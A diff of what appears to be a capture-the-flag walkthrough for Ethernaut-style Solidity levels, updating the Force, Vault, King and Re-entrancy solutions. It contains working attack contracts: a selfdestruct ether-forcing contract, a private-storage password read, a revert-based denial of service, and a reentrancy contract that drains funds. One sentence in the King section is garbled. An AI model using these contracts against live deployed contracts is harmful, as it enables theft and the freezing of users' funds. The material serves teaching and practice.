@@ -86,47 +86,49 @@ let payload = web3.eth.abi.encodeFunctionSignature({
     inputs: []
 });
 
-await contract.sendTransaction({
+await web3.eth.sendTransaction({
+    from: player,
+    to: instance,
     data: payload
 });
 ```
 
 ## 7. Force
-You can easily forcibly send ether to a contract. Read [this](https://consensys.github.io/smart-contract-best-practices/known_attacks/#forcibly-sending-ether-to-a-contract) to learn more.
+Even if a contract doesn't implement a receive / fallback or any payable functions to handle incoming ETH, it is still possible to forcefully send ETH to a contract through the use of `selfdestruct`. If you're deploying this contract through remix, don't forget to specify value before deploying the AttackForce contract or the `selfdestruct` won't be able to send any ETH over as there are no ETH in the contract to be sent over!
 ```
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract AttackForce {
-    
-    constructor(address payable _victim) public payable {
+
+    constructor(address payable _victim) payable {
         selfdestruct(_victim);
     }
 }
 ```
 
 ## 8. Vault
-Your private variables are private if you try to access it the normal way e.g. via another contract but the problem is that everything on the blockchain is visible so even if the variable's visibility is set to private, you can still access it based on its index in the smart contract. Learn more about this [here](https://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage).x
+Your private variables are private if you try to access it the normal way e.g. via another contract but the problem is that everything on the blockchain is visible so even if the variable's visibility is set to private, you can still access it based on its index in the smart contract. Learn more about this [here](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html).
 ```
 const password = await web3.eth.getStorageAt(instance, 1);
 await contract.unlock(password);
 ```
 
 ## 9. King
-This is a classic example of DDoS with unexpected revert when part of the logic in the victim's contract involves transferring ether to the previous "lead", which in this case is the king. A malicious user would create a smart contract with either:
+This is a classic example of DDoS with unexpected revert when the logic of the victim's contract involve sending funds to  in the victim's contract involves transferring ether to the previous "lead", which in this case is the king. A malicious user would create a smart contract with either:
 
 - a `fallback` / `receive` function that does `revert()`
 - or the absence of a `fallback` / `receive` function
 
-Once the malicious user uses this smart contract to take over the "king" position, all funds in the victim's contract is effectively stuck in there because nobody can take over as the new "king" no matter howm uch ether they use because the fallback function in the victim's contract will always fail when it tries to do `king.transfer(msg.value);`
+Once the malicious user uses this smart contract to take over the "king" position, all funds in the victim's contract is effectively stuck in there because nobody can take over as the new "king" no matter how much ether they use because the fallback function in the victim's contract will always fail when it tries to do `king.transfer(msg.value);`
 ```
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract AttackKing {
-    
-    constructor(address payable _victim) public payable {
-        _victim.call.gas(1000000).value(1 ether)("");
+
+    constructor(address _victim) payable {
+        _victim.call{value: 10000000000000000 wei}("");
     }
-    
+
     receive() external payable {
         revert();
     }
@@ -134,35 +136,51 @@ contract AttackKing {
 ```
 
 ## 10. Re-entrancy
-The same hack as the DAO hack. Due to the ordering of the transactions, the malicious contract is able to keep calling the withdraw function as the internal state is only updated after the transfer is done. When the call.value is processed, the control is handed back to the `fallback` function of the malicious contract which then calls the withdraw function again. Note that the number of times the fallback function runs is based on the amount of gas submitted when you call `maliciousWithdraw()`. 
+This is the same exploit that led to the [DAO hack](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/). Due to the ordering of the functions in the victim contract (sending funds before updating internal state), the malicious contract is able to keep calling the `withdraw` function as the internal state is only updated after the transfer is done.
 
-Note: You need to use `uint256` instead of `uint` when encoding the signature.
+When `msg.sender.call{value:_amount}("")` is processed, the control is handed back to the `receive` function of the malicious contract which then calls the `withdraw` function again. This is how the malicious contract is able to siphon all the funds.
+
+There are 2 things to note:
+
+1. The gas limited specified when calling the `maliciousWithdraw` function will determine how many times the reentracy call can happen.
+
+2. You may need to manually increase the gas limit in the metamask prompt otherwise the reentrancy calls will not have enough gas to succeed.
 ```
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract AttackReentrancy {
     address payable victim;
-    
-    constructor(address payable _victim) public payable {
+    uint256 targetAmount = 0.001 ether; // This is the amount that the victim contract was seeded with.
+
+    constructor(address payable _victim) public {
         victim = _victim;
-        
-        // Call Donate
-        bytes memory payload = abi.encodeWithSignature("donate(address)", address(this));
-        victim.call.value(msg.value)(payload);
     }
-    
-    function maliciousWithdraw() public payable {
-        // Call withdraw
-        bytes memory payload = abi.encodeWithSignature("withdraw(uint256)", 0.5 ether);
+
+    // Don't forget to specify 1000000000000000 wei if calling this via remix!
+    function donate() public payable {
+        require(msg.value == targetAmount, "Please call donate with 0.001 ETH.");
+        bytes memory payload = abi.encodeWithSignature("donate(address)", address(this));
+        (bool success, ) = victim.call{value: targetAmount}(payload);
+        require(success, "Transaction call using encodeWithSignature is successful");
+    }
+
+    function maliciousWithdraw() public {
+        bytes memory payload = abi.encodeWithSignature("withdraw(uint256)", targetAmount);
         victim.call(payload);
     }
-    
-    fallback() external payable {
-        maliciousWithdraw();
+
+    receive() external payable {
+        // This attack contract has a malicious receive fallback function
+        // that calls maliciousWithdraw again which calls withdraw!
+        // This is how the reentrancy attack works.
+        uint256 balance = victim.balance;
+        if (balance >= targetAmount) {
+            maliciousWithdraw();
+        }
     }
-    
+
     function withdraw() public {
-        msg.sender.transfer(address(this).balance);
+        payable(msg.sender).transfer(address(this).balance);
     }
 }
 ```
